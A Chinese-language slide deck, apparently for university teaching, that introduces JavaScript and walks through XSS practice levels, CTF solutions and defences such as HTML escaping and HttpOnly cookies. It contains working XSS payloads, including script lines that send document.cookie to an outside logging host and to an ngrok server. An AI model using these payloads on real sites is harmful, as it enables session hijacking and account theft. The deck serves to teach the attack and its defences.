---
title: 107 javascript + XSS
tags: 大學 , 助教 , 安全程式
---

<style>// css
@keyframes setup{
  0% {
    opacity: 0;
  }
  75% {
    opacity: 1;
    transform: none;
  }
  100% {
    opacity: 1;
    transform: rotateZ(5deg);
  }
}
@keyframes dance{
  0% {
    transform: rotateZ(5deg);
  }
  50% {
    transform: rotateZ(-5deg);
  }
  100% {
    transform: rotateZ(5deg);
  }
}
.demo4_multiple {
  animation: setup 2s ease-out,
             dance 1s 2s cubic-bezier(0, .8, .5, 1.5) infinite;
  background: #3991AE;
  color: #fff;
  font-size: 10rem;
  padding: 1rem 1.5rem;
  position: relative;
  text-align: center;
  transform: rotateX(-90deg);
}</style>

---

# Javascript & XSS

---

# 甚麼是 Javascript

---

JavaScript，通常縮寫為JS，是一種進階的，解釋執行的程式語言。
JavaScript是一門基於原型、函式先行的語言，是一門多範式的語言，它支援物件導向編程，指令式程式設計，以及函數語言程式設計。
它提供語法來操控文字、陣列、日期以及正規表示式等，不支援I/O，比如網路、儲存和圖形等，但這些都可以由它的宿主環境提供支援。它已經由ECMA（歐洲電腦製造商協會）通過ECMAScript實現語言的標準化
。它被世界上的絕大多數網站所使用，也被世界主流瀏覽器（Chrome、IE、Firefox、Safari、Opera）支援。

---

# 蛤？

---

## 他是一個讓網頁 
<section class="centered">
	<div class="demo4_multiple">
		<h1>動起來</h1>
	</div>
</section>


的程式語言
~~媽的上面明明就用CSS~~

---

我們先試試看把javaScript關掉
網頁會變怎麼樣吧

---

你把Chrome右上角三個點 > 設定 >  
![](https://i.imgur.com/idkeEvs.png)

---

左邊三條線 > 進階 > 隱私權和安全性 >  
![](https://i.imgur.com/gnbCqfB.png)

---

內容設定 > 把JS關掉
![](https://i.imgur.com/xlN6FCl.png)

---

然後開Youtube

---

### 神奇的事發生了
![沒有JS的youtube](https://i.imgur.com/udGQm2b.png)

---

現在用的網頁基本上都一定有JS
他是一個直譯式的程式語言
就跟python一樣

---

那要在哪裡輸入呢 ?
我們隨便開個網頁 右鍵按檢查
![](https://i.imgur.com/ZvMz6YJ.png)

---


這裡就是執行js的地方了

![](https://i.imgur.com/G6kAgxV.png)


---

基本變數使用 
宣告 a
```javascript=
a = 1 
b = 2
a + b 
```
![](https://i.imgur.com/kYDGFKx.png)


---

就是這麼簡單
那麼試試看
```javascript=
a=0.1+0.2
alert(a)
```

---

# [0.30000000000000004](http://zencode.in/1.浮点数加减问题.html)

---


#### 基本流程控制(一)
```javascript
if(/*如果這樣*/){/*就那樣*/}
else {/*不然就這樣*/}
```

```javascript
if(/*如果這樣*/){/*就那樣*/}
else if(/*那只好看看會不會這樣*/){/*嗯好就換這樣*/}
else {/*好吧那只好這樣*/}
```

---

#### 迴圈基本流程控制(二)

```javascript
while(/*每次做完都檢查，符合的話就做右邊那個*/){/*就是我，每次做我*/}
```

```javascript
for(/*初始*/;/*條件*/;/*++*/){/*每次做這個*/}
```

---

網頁互動方面
```javascript=
alert("喔喔喔喔")
```
![](https://i.imgur.com/cjAJLAg.png)



---

試試看這個
```javascript=
document.getElementsByTagName('body')[0].innerHTML=""
```

---

那麼 網頁和javascript是甚麼關係呢

---

那麼我們來寫個網頁吧(?)

---

網頁分成三種語法：
HTML（結構）
CSS（外觀）
Javascript（動畫、互動）

---

我們打開一個網頁
按右鍵 打開原始碼
![](https://i.imgur.com/qv75FJA.png)


---

這串就是網頁的原始碼
我們網頁就是這些東西構成
![](https://i.imgur.com/h9iryPt.png)


---

我們可以打開一個記事本
然後輸入這些東西
就會變成網頁
```htmlmixed=
<html>
    <head>
    <title>我是抬頭</title>
    </head>
    <body>
        <h1>
            我很大
        </h1>
        <p>
            我小小的
        </p>
    </body>
</html>
```

---

把它存檔 
記得要取名成.html
![](https://i.imgur.com/DVYY6uf.png)


---

打開來我們會看到
我們寫好的網頁
![](https://i.imgur.com/QhALXJc.png)


---

而JS在網頁裡是被包在`<script></script>`裡面
我們在記事本加入 
```htmlmixed=
<script>alert(1)</script>
```
存檔，重新整理


---

哦哦哦哦哦喔ㄚㄚㄚㄚ!跳出來了!!!!
![](https://i.imgur.com/FKHphlx.png)


---

所以js可以影響你看到的網頁
因為他是拿程式碼到你電腦執行
所以只會影響到執行的那台電腦
~~還可以拿來挖礦~~

---

# 甚麼是 XSS 攻擊

---

想像今天有個留言板
可以讓你留言在網頁上
那你可不可以留言網頁的程式碼呢?

---

如果網頁沒寫好
# 可以

---

# 那會怎麼樣呢?
可以像剛剛把網頁變成全白
可以叫別人幫你挖礦
可以取得他人帳號

---

只要你能在對方網頁插入程式碼
(並非右鍵更改 而是讓程式碼永久在對方伺服器上)
這就是 XSS攻擊

---

我們通常用讓網頁噴出 1代表能成功XSS
所以我們目標先朝著讓他彈出視窗
也就是植入下列程式碼
`alert(1)`
因為你能植入這個也代表你能植入其他
就能得到別人帳號

---

那我們來練習吧
https://xss-game.appspot.com/

---

第一關很簡單
我們可以看到一個書入口
我們塞塞看八

![](https://i.imgur.com/8yigOpj.png)

---

我們看到他會把我輸入的字 顯示上來
![](https://i.imgur.com/XF4vvgJ.png)

---

那我們試試看輸入
`<script>alert(1)</script>`

---

喔喔喔喔喔喔喔 出來了
![](https://i.imgur.com/u6wey66.png)

---


我們觀察一下 
原本程式碼長這樣
```htmlmixed=


<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>

  <body id="level1">
    <img src="/static/logos/level1.png">
      <div>
Sorry, no results were found for <b>測試</b>. <a href='?'>Try again</a>.
    </div>
  </body>
</html>

```

---

他把我們輸入的文字放在這
```htmlmixed=
<b>測試</b>
```
我們塞入XSS他變成這樣
```htmlmixed=
<b><script>alert(1)</script></b>
```
就變成js執行了呢

---

那我們插入這個呢
```htmlmixed=
<script>document.getElementsByTagName('body')[0].innerHTML="Hacked"</script>
```

---

好像會被抓走
![](https://i.imgur.com/VxNMecH.png)



---

接下來到第二階段
我們看到一個留言板
但是我們留言`<script>alert(1)</script>`
會發現他把script過濾掉了
空空如也
![](https://i.imgur.com/i8rW3u2.png)

---

這時候就要用一個小技巧
`<img>`
標籤
他有一個onerror 屬性

---

## 甚麼是  屬性呢?
html 裡面是由 標籤`<a></a>`組成
其中 前面的標籤可以放一些屬性
```htmlmixed=
<a class="some" name="WOW" id="XD" href="index">text</a>
```
像是 a標籤 裡個href屬性是拿來放超連結位子

---

而`<img>`有一個onerror屬性
他會在影像出錯時 執行設定的js
```htmlmixed=
<img src="圖片網址" onerror="alert(1)">
```

---

我們試試看塞入這個
```htmlmixed=
<img src="才不存在呢" onerror="alert(1)">
```

---

跳出來了呢
![](https://i.imgur.com/NCC3TMW.png)

---

剩下幾關自己練習看看
~~因為有點無聊~~

---


第四關：在輸入框中放入 3’);alert(1);//
第五關：把網址改成 https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
第六關：把網址改成 https://xss-game.appspot.com/level6/frame#Https://www.google.com/jsapi?callback=alert

---

接下來講點 比較實用的
好剛剛講了XSS可以偷帳戶資料
到底怎麼偷的呢?

---

大家開FB 試試看在console
```javascript=
alert(document.cookie)
```
![](https://i.imgur.com/G6kAgxV.png)

---

跑出很多看不懂的東西對吧
![](https://i.imgur.com/92ME0sn.png)

---

大家有沒有想過 為什麼登入FB只要一次
第二次就不用再登入了呢?

---

一定有個東西在驗證你是誰吧

## 並不是IP

---

那個東西叫做cookies
也就是你剛剛看到的那串

---

它存在這
![](https://i.imgur.com/0SzvyQz.png)


---

那 假如 有人寫一個JS 
讀到那串 不是讓他跳出來
而是傳到駭客伺服器呢?

---

很棒！你的帳號歸別人了
這就是XSS的危險

---

而且實做起來非常簡單 只要這段就可以了
```htmlmixed=
<script>document.location.href="https://logs.foxo.tw/"+document.cookie</script>
```

---

大家把這段打在console 
```javascript=
document.location.href="https://logs.foxo.tw/"+document.cookie
```
我就可以在這裡看到你們的cookies
~~有沒有人要試試看~~
## 帳號之後被盜不要找我!

---

原理: 
架一個網頁伺服器 記錄檔會記錄所有瀏覽過的路近
```java=
https://(網頁domain)/(路徑)
```
```javascript=
document.location.href //會轉跳
```

---


試試看吧 架設server
首先下載[Ngrok](https://ngrok.com/download)
![](https://i.imgur.com/Lz9grZL.png)


---

解壓縮 把他拖進cmd裡 並在後面補上 `http 80`
ex:`norgk.exe http 80`
![](https://i.imgur.com/CDh5rks.png)

---

你的server網址
![](https://i.imgur.com/IsalIrI.png)


---

複製起來 把`{這裡}`取代
```javascript=
document.location.href="{這裡}"+document.cookie
```
然後貼在console
![](https://i.imgur.com/G6kAgxV.png)

---

![](https://i.imgur.com/Mnc0jgj.png)


---

enter 之後
![](https://i.imgur.com/kgDlVZ6.png)

---

練習這題 XSS吧
http://140.134.25.138:10007/
管理員會「看」所有留言板的留言
拿到我的cookies吧
(答案格式`CTF{}`)


----

解答:
```htmlmixed=
</td><script>document.location.href="http://32db1a40.ngrok.io/"+document.cookie</script>
```
![](https://i.imgur.com/XBbGtpu.png)

---


# 那我們該如何防禦呢?

---

# 1. 將特殊符號改成html格式

---

把 使用者輸入的文字 轉成 [HTML特殊字元編碼](https://footmark.info/web-design/html/special-symbol-table-html/)
![](https://i.imgur.com/wHXyn3j.png)

---

可以看到原始檔案 和顯示出的文字不同
而且script沒被解析
![](https://i.imgur.com/j2xGDnj.png)


---

在php 裡面也有function 可以用
```php=
<? php
$str=htmlspecialchars($str)
```

---

# 2. HttpOnly cookies 

---

server在設定cookies時候 結尾加上
` ; HttpOnly `
此選項將會讓 javascript 
## 無法使用讀取cookies

---

補充 Html CSS JS 進階應用